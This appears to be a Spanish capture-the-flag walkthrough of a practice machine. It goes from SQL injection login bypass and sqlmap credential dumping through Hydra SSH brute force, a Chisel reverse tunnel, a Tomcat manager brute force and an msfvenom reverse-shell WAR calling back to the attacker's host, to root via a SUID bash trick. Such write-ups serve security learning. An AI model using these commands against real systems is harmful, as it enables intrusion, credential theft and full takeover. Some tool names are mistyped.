nmap: 22,80

![image](https://github.com/user-attachments/assets/c7952ccc-1a71-4e0f-8171-57b0b65eff9f)

---

entramos a la pagina principal

![image](https://github.com/user-attachments/assets/5b370534-bdd8-4936-8f3f-2f41dd4890cf)


En el login de la pagina

![image](https://github.com/user-attachments/assets/08eeadc6-b8c7-451d-8990-0d9e60ec74bf)


probamos un sql básico " 'or 1=1-- -" y nos da acceso al panel de control, o sea es vulnerable a un RCE o LFI.  y buscando que mas hacer par obtener algún usuario o algo, encontré que podemos ver la base de datos por esto:

![image](https://github.com/user-attachments/assets/f7d1bf36-5e3a-44ae-b6b6-610cded1346a)


probamos con la base de datos

    sqlpmap --url http://172.17.0.2/login.php --forms --batch --dbs

![image](https://github.com/user-attachments/assets/5135f540-3545-4ba5-9d04-2dd87713d821)


ahora mas especifico:

    qlmap --url http://172.17.0.2/login.php --forms --batch --dbs --time-sec=1 --dump

nos da después de un rato una tabla con usuarios y contraseñas posibles:

![image](https://github.com/user-attachments/assets/763169fd-80d6-447c-be57-2bdafc6f3932)

creamos en nuestra terminal un txt de pass y user. 
luego un hydra para que pruebe combinaciones: 

    hydra -L user.txt -P pass.txt ssh://172.17.0.2 -vV

nos dio: 

![image](https://github.com/user-attachments/assets/e52d80f1-af2d-4400-aa76-828e83f0f9d8)

entramos por el ssh

![image](https://github.com/user-attachments/assets/f7c0fa87-a2b7-41cd-a94f-e3c665e96fac)

y vemos que hay tres usuarios: Alice, Mario y rosa que somos nosotros.

escalamos: encontré esta nota  

![image](https://github.com/user-attachments/assets/d19e416a-dacb-41fd-a87b-8d763cce1240)

![image](https://github.com/user-attachments/assets/f8951e5a-d763-411d-834c-04e1c4690a46)

el contenido de la nota: flowerpower.
probé si era la contraseña pero no es y
buscando probé con el comando 

     netstat -an

y me dio esto que me llamo la atención

![image](https://github.com/user-attachments/assets/78ebbd5b-efa2-49a3-84c4-9d4d57fd3244)

descargamos chisel: https://github.com/jpillora/chisel/releases/tag/v1.10.0

gunzip chisel
y lo pasamos a la maquina victima con wget mientras tenemos el servidor abierto en nuestra terminal. 

    wget http://172.17.0.2/chisel

![image](https://github.com/user-attachments/assets/426933b9-39c2-4449-a92d-6419d50b27e2)

iniciamos en nuestra terminal un servidor: 

    ./chisel server -p 1234 --reverse
y en la maquina víctima: 

    ./chisel client 172.17.0.1:1234 R:443:127.0.0.1:8080

![image](https://github.com/user-attachments/assets/3951ac97-1b21-4dcd-b412-72d98c1db16e)

entonces entramos al puerto 8080 por el 443:
http://127.0.0.1:443/

![image](https://github.com/user-attachments/assets/ad125df8-1b3c-4920-9000-60a0dce2a4c8)

ahora empezamos a escalar hacia los otros usuarios a través de "manager app" de la pagina tomcat.

como ninguna credencial que buscamos en: https://book.hacktricks.xyz/v/es/network-services-pentesting/pentesting-web/tomcat

sirvió mas abajo en la misma pagina nos muestra que busquemos por metasploit:

hacemos una fuerza bruta  a través de metasploit con los siguientes pasos:

     - use auxiliary/scanner/http/tomcat_mgr_login
     - set RHOSTS 127.0.0.1
     - set RPORT 8080
     - set USER_FILE /home/skopjee/user.txt
     - set PASS_FILE /home/skopjee/pass.txt
     - set TARGETURI /manager/html
     - run
y nos dio

    [+] 127.0.0.1:8080 - Login Successful: tomitoma:supersecurepasswordultra


ingresamos a mager app

![image](https://github.com/user-attachments/assets/a08c51e3-d37c-4724-b19f-e32878b0b8ce)

creamos un archivo malicioso: 

    msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=4444 -f war -o rev.war

lo subimos en el apartado de "WAR"

![image](https://github.com/user-attachments/assets/1b98e90d-1784-408a-8e54-70d09ee51e97)

cargamos y a parecerá en la parte principal de la pagina como "rev"

![image](https://github.com/user-attachments/assets/6fa74400-6985-45c9-acfc-63e741031fdf)

ahora colocamos el terminal en escucha y nos conectamos

![image](https://github.com/user-attachments/assets/7d717caa-6b8f-4e36-bc13-f1d2bf9f5525)

luego de conectarme buscamos como llegar a root:

![image](https://github.com/user-attachments/assets/a5c2ada3-0d35-40ca-b1ca-5d58598a3596)

escalamos privilegios con sh:

    echo 'chmod u+s /bin/bash' >> /opt/tomcat/bin/catalina.sh

ahora lo iniciamos

     sudo -u root /opt/tomcat/bin/catalina.sh start

si vemos los permisos bash veremos que cambiaron:

![image](https://github.com/user-attachments/assets/72f11ffe-d1bd-4a6d-88ae-73ff5bce0be9)

y al hacer el bash -p seremos root!
